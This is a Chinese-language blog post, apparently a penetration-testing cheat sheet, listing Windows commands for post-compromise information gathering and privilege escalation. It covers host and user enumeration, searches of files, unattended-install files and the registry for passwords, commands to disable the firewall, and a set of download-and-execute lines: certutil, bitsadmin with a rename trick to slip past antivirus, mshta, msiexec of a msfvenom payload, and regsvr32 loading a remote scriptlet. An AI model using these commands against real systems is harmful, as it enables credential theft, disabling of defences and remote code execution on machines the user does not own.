<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>Windows信息收集 | langke Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">langke&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                

            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">langke&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div id="post-toc" class="post-toc">
            <span class="post-toc-title">catalogue</span>
            <div class="post-toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web渗透信息收集"><span class="toc-text">web渗透信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网信息收集"><span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-提权信息收集"><span class="toc-text">Windows 提权信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-操作系统的名称和版本信息"><span class="toc-text">1. 操作系统的名称和版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-主机名称和所有环境变量"><span class="toc-text">2. 主机名称和所有环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-查看用户信息"><span class="toc-text">3. 查看用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-查看远程端口"><span class="toc-text">4. 查看远程端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-查看网络情况"><span class="toc-text">5. 查看网络情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-应用程序和服务"><span class="toc-text">6. 应用程序和服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-检索敏感文件"><span class="toc-text">7. 检索敏感文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-目录文件操作"><span class="toc-text">8. 目录文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-RAR打包"><span class="toc-text">9. RAR打包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-PHP读文件"><span class="toc-text">10. PHP读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-下载文件"><span class="toc-text">11. 下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-注册表关键字搜索"><span class="toc-text">12. 注册表关键字搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-系统权限配置"><span class="toc-text">13. 系统权限配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-自动收集系统有用的脚本"><span class="toc-text">14. 自动收集系统有用的脚本</span></a></li></ol></li></ol>
            </div>
        </div>
    
    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Windows信息收集</h1>
            
                <div class="post-meta">
                    

                    
                        <span class="post-time">
                        Date: <a href="#">06 29&nbsp;&nbsp;11:10:06</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <section class="post-content">
            <h2 id="web渗透信息收集"><a href="#web渗透信息收集" class="headerlink" title="web渗透信息收集"></a>web渗透信息收集</h2><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h2 id="Windows-提权信息收集"><a href="#Windows-提权信息收集" class="headerlink" title="Windows 提权信息收集"></a>Windows 提权信息收集</h2><p>Windows提权信息涉及多个方面，下面分别进行介绍。</p>
<a id="more"></a>
<h3 id="1-操作系统的名称和版本信息"><a href="#1-操作系统的名称和版本信息" class="headerlink" title="1. 操作系统的名称和版本信息"></a>1. 操作系统的名称和版本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>
<h3 id="2-主机名称和所有环境变量"><a href="#2-主机名称和所有环境变量" class="headerlink" title="2. 主机名称和所有环境变量"></a>2. 主机名称和所有环境变量</h3><p>主机名称：<code>hostname</code><br>环境变量：<code>SET</code></p>
<h3 id="3-查看用户信息"><a href="#3-查看用户信息" class="headerlink" title="3. 查看用户信息"></a>3. 查看用户信息</h3><p>查看所有用户:<code>net user</code>或<code>net1 user</code><br>查看管理员用户组:<code>net localgroup Administrators</code>或<code>net1 localgroup Administrators</code><br>查看远程终端在线用户:<code>query user</code>或<code>quser</code></p>
<h3 id="4-查看远程端口"><a href="#4-查看远程端口" class="headerlink" title="4. 查看远程端口"></a>4. 查看远程端口</h3><p>（1）通过注册表查看<br><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp/v PortNumber</code></p>
<p>（2）通过命令行查看<br>获取对应的PID号：<code>tasklist /svc | find &quot;TermService&quot;</code><br>通过PID号查找端口：<code>netstat -ano | find &quot;1980&quot;</code></p>
<h3 id="5-查看网络情况"><a href="#5-查看网络情况" class="headerlink" title="5. 查看网络情况"></a>5. 查看网络情况</h3><p>网络配置情况：<code>ipconfig /all</code><br>路由器信息：<code>route print</code><br>查看ARP缓存：<code>arp -a</code><br>查看网络连接：<code>netstat -ano</code><br>查看防火墙规则<code>netsh firewall show config</code>或<code>netsh firewall show state</code><br>关闭防火墙：<code>netsh advfirewall set publicprofile state off</code>or<code>netsh firewall set opmode disable</code></p>
<h3 id="6-应用程序和服务"><a href="#6-应用程序和服务" class="headerlink" title="6. 应用程序和服务"></a>6. 应用程序和服务</h3><p>查看服务的进程ID：<code>tasklist /SVC</code><br>查看已安装驱动程序的列表：<code>DRIVERQUERY</code><br>查看已经启动的Windows服务：<code>net start</code><br>查看某服务的启动权限：<code>sc qc TermService</code><br>查看已安装程序的列表：<code>wmic product list brief</code><br>查看服务列表：<code>wmic service list brief</code><br>查看进程列表：<code>wmic process list brief</code><br>查看启动程序列表：<code>wmic startup list brief</code><br>查看已安装的更新和安装日期：<code>wmic qfe get Caption,De**ion,HotFixID,InstalledOn</code><br>搜索可以提升权限的特定漏洞：<code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;</code><br>结束程序： <code>wmic process where name=&quot;iexplore&quot; call terminate</code></p>
<h3 id="7-检索敏感文件"><a href="#7-检索敏感文件" class="headerlink" title="7. 检索敏感文件"></a>7. 检索敏感文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s password.txt</span><br><span class="line">dir /b /s *.doc</span><br><span class="line">dir /b /s *.ppt</span><br><span class="line">dir /b /s *.xls</span><br><span class="line">dir /b /s *.docx</span><br><span class="line">dir /b /s *.xlsx</span><br><span class="line">dir /b /s config.* filesystem</span><br><span class="line">findstr /si password *.xml *.ini *.txt</span><br><span class="line">findstr /si login *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
<p>除此之外，还可以检查无人值守安装日志文件。这些文件通常包含Base64编码的密码。在大型企业中，单个系统手动安装是不切实际的，找到这些文件即可获取管理员密码。这些文件的共同位置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
<h3 id="8-目录文件操作"><a href="#8-目录文件操作" class="headerlink" title="8. 目录文件操作"></a>8. 目录文件操作</h3><p>列出<code>d:\www</code>下的所有目录：<code>for /d %i in (d:\www\*) do @echo %i</code><br>把当前路径下文件夹名字只有<code>1~3</code>个字母的显示出来：<code>for /d %i in (???) do @echo %i</code><br>以当前目录为搜索路径，把当前目录及其子目录中的全部EXE文件列出：<code>for /r %i in (*.exe) do @echo %i</code><br>以制定目录为搜索路径，把当前目录及其子目录中的所有文件列出：<code>for /r &quot;f:\freehost\hmadesign\web\&quot; %i in (*.*) do @echo %i</code><br>显示a.txt中的内容，因为/f的作用，会读出a.txt中的内容：<code>for /f %i in (c:\1.txt) do echo %i</code></p>
<h3 id="9-RAR打包"><a href="#9-RAR打包" class="headerlink" title="9. RAR打包"></a>9. RAR打包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar a -k -r -s -m3 c:\1.rar d:\wwwroot</span><br></pre></td></tr></table></figure>
<h3 id="10-PHP读文件"><a href="#10-PHP读文件" class="headerlink" title="10. PHP读文件"></a>10. PHP读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/php/php.exe &quot;c:/www/admin/1.php</span><br></pre></td></tr></table></figure>
<h3 id="11-下载文件"><a href="#11-下载文件" class="headerlink" title="11. 下载文件"></a>11. 下载文件</h3><p>Windows 7 及以上版本下载可以使用的bitsadmin和PowerShell<br>bitsadmin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer 任务名(随便填) http://www.baidu.com/index.exe d:\index.exe</span><br><span class="line"></span><br><span class="line">有时候直接保存d:\index.exe会被杀毒软件拦截，所以可以先保存为d:\index.txt，下载完成后，再重命名</span><br><span class="line"></span><br><span class="line">ren d:\index.txt d:\index.exe</span><br></pre></td></tr></table></figure></p>
<p>powershell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://fastsoft.onlinedown.net/down/25572_20161130180100.exe&apos;,&apos;index.exe&apos;)</span><br></pre></td></tr></table></figure></p>
<p>IPC$<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy E:\file \\192.168.3.1\c$\test.exe</span><br></pre></td></tr></table></figure></p>
<p>Certutil<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe</span><br></pre></td></tr></table></figure></p>
<p>mshta<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mshta http://www.site.xom/1.hta</span><br><span class="line">// 直接执行hta文件</span><br></pre></td></tr></table></figure></p>
<p>msiexec<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi</span><br><span class="line">msiexec /quiet /i https://website.com/payloads/cacl.msi</span><br></pre></td></tr></table></figure></p>
<p>rundll32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行32位的dll文件</span><br></pre></td></tr></table></figure></p>
<p>regsvr32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</span><br></pre></td></tr></table></figure></p>
<p>更多更详细：<br><a href="https://xz.aliyun.com/t/1649/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1649/</a><br><a href="https://www.cnblogs.com/17bdw/p/8550189.html#_label1_9" target="_blank" rel="noopener">https://www.cnblogs.com/17bdw/p/8550189.html#_label1_9</a></p>
<h3 id="12-注册表关键字搜索"><a href="#12-注册表关键字搜索" class="headerlink" title="12. 注册表关键字搜索"></a>12. 注册表关键字搜索</h3><p>password为关键字，可以是vnc等敏感关键字，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure></p>
<h3 id="13-系统权限配置"><a href="#13-系统权限配置" class="headerlink" title="13. 系统权限配置"></a>13. 系统权限配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cacls c:\</span><br><span class="line">cacls c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
<h3 id="14-自动收集系统有用的脚本"><a href="#14-自动收集系统有用的脚本" class="headerlink" title="14. 自动收集系统有用的脚本"></a>14. 自动收集系统有用的脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic process get CSName,status,Name /format:htable &gt;&gt; out.html   // 查询进程信息</span><br><span class="line">wmic USERACCOUNT list      // 查询用户信息</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName   //查看服务信息</span><br><span class="line">wmic group list full       // 查询组信息</span><br></pre></td></tr></table></figure>
        </section>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        

        <!--
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Windows单机信息收集/"># Windows单机信息收集</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        -->
        <!--
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/07/07/加密/">加密</a>
            
            
            <a class="next" rel="next" href="/2019/06/10/Cobalt-Strike神器入门历程/">Cobalt Strike神器入门</a>
            
        </section>
        -->

    </article>
</div>

        </div>
        <!--
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    	-->

    	<br>
    	<br>
    	<br>



    </div>
</body>
</html>
